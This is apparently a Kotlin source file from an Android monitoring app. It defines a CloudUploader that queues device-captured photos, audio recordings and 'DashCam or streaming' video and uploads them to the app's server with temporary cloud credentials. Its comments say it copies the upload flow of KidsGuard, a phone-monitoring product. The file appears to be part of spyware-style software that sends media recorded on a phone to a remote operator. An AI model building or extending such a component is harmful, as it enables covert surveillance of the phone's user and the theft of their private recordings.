package com.empresa.monitor.service.cloud

import android.content.Context
import android.net.Uri
import com.empresa.monitor.data.api.ApiClient
import com.empresa.monitor.data.model.DeviceLogApiRequest
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.util.concurrent.TimeUnit

/**
 * Cloud storage uploader — compatible with Alibaba OSS / S3 / MinIO.
 * Fetches temporary STS credentials from the server,
 * then uploads files directly to cloud storage.
 *
 * Matches KidsGuard's OSS upload flow:
 * 1. Request STS token from /sts/accessKey
 * 2. Get temporary AccessKeyId + AccessKeySecret + SecurityToken
 * 3. Upload files with these credentials
 * 4. Report upload status back to server
 */
class CloudUploader(private val context: Context) {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var deviceId: String? = null
    private val uploadQueue = mutableListOf<UploadTask>()
    private var isUploading = false

    data class UploadTask(
        val localPath: String,
        val remotePath: String,
        val contentType: String,
        val callback: ((Boolean) -> Unit)? = null
    )

    companion object {
        private var instance: CloudUploader? = null
        fun getInstance(context: Context): CloudUploader {
            if (instance == null) instance = CloudUploader(context)
            return instance!!
        }
    }

    fun setDeviceId(id: String) { deviceId = id }

    /**
     * Queue a file for upload.
     */
    fun upload(localPath: String, remotePath: String, contentType: String,
               callback: ((Boolean) -> Unit)? = null) {
        synchronized(uploadQueue) {
            uploadQueue.add(UploadTask(localPath, remotePath, contentType, callback))
        }
        processQueue()
    }

    /**
     * Upload a photo captured by the device.
     */
    fun uploadPhoto(file: File, callback: ((Boolean) -> Unit)? = null) {
        val remotePath = "photos/${deviceId}/${file.name}"
        upload(file.absolutePath, remotePath, "image/jpeg", callback)
    }

    /**
     * Upload an audio recording.
     */
    fun uploadAudio(file: File, callback: ((Boolean) -> Unit)? = null) {
        val remotePath = "audio/${deviceId}/${file.name}"
        upload(file.absolutePath, remotePath, "audio/mp4", callback)
    }

    /**
     * Upload a video recording (DashCam or streaming).
     */
    fun uploadVideo(file: File, callback: ((Boolean) -> Unit)? = null) {
        val remotePath = "videos/${deviceId}/${file.name}"
        upload(file.absolutePath, remotePath, "video/mp4", callback)
    }

    private fun processQueue() {
        if (isUploading) return
        isUploading = true

        scope.launch {
            while (true) {
                val task: UploadTask?
                synchronized(uploadQueue) {
                    task = uploadQueue.firstOrNull()
                    if (task != null) uploadQueue.removeAt(0)
                }

                if (task == null) {
                    isUploading = false
                    break
                }

                val success = performUpload(task)
                task.callback?.invoke(success)
            }
        }
    }

    private suspend fun performUpload(task: UploadTask): Boolean {
        return withContext(Dispatchers.IO) {
            try {
                val file = File(task.localPath)
                if (!file.exists()) return@withContext false

                // Get STS credentials from server (like KidsGuard does)
                val stsToken = requestStsToken() ?: return@withContext false

                // Upload using STS credentials
                val client = OkHttpClient.Builder()
                    .connectTimeout(30, TimeUnit.SECONDS)
                    .writeTimeout(120, TimeUnit.SECONDS)
                    .readTimeout(30, TimeUnit.SECONDS)
                    .build()

                // Build multipart request to our own server proxy
                // (This proxies to OSS to avoid embedding Alibaba SDK)
                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("device_id", deviceId ?: "unknown")
                    .addFormDataPart("remote_path", task.remotePath)
                    .addFormDataPart("content_type", task.contentType)
                    .addFormDataPart("access_key_id", stsToken.accessKeyId)
                    .addFormDataPart("access_key_secret", stsToken.accessKeySecret)
                    .addFormDataPart("security_token", stsToken.securityToken)
                    .addFormDataPart(
                        "file",
                        file.name,
                        file.asRequestBody(task.contentType.toMediaTypeOrNull())
                    )
                    .build()

                val request = Request.Builder()
                    .url("${com.empresa.monitor.BuildConfig.API_BASE_URL}cloud/upload")
                    .post(requestBody)
                    .build()

                val response = client.newCall(request).execute()
                response.isSuccessful
            } catch (e: Exception) {
                e.printStackTrace()
                false
            }
        }
    }

    private suspend fun requestStsToken(): StsToken? {
        return withContext(Dispatchers.IO) {
            try {
                val client = OkHttpClient.Builder()
                    .connectTimeout(10, TimeUnit.SECONDS)
                    .readTimeout(10, TimeUnit.SECONDS)
                    .build()

                val request = Request.Builder()
                    .url("${com.empresa.monitor.BuildConfig.API_BASE_URL}cloud/sts")
                    .post("{}".toRequestBody("application/json".toMediaTypeOrNull()))
                    .build()

                val response = client.newCall(request).execute()
                if (response.isSuccessful) {
                    val json = JSONObject(response.body?.string() ?: "{}")
                    StsToken(
                        accessKeyId = json.optString("access_key_id", ""),
                        accessKeySecret = json.optString("access_key_secret", ""),
                        securityToken = json.optString("security_token", ""),
                        bucket = json.optString("bucket", "monitor-uploads"),
                        endpoint = json.optString("endpoint", "")
                    )
                } else null
            } catch (e: Exception) { null }
        }
    }

    private data class StsToken(
        val accessKeyId: String,
        val accessKeySecret: String,
        val securityToken: String,
        val bucket: String,
        val endpoint: String
    )

    fun destroy() { scope.cancel() }
}
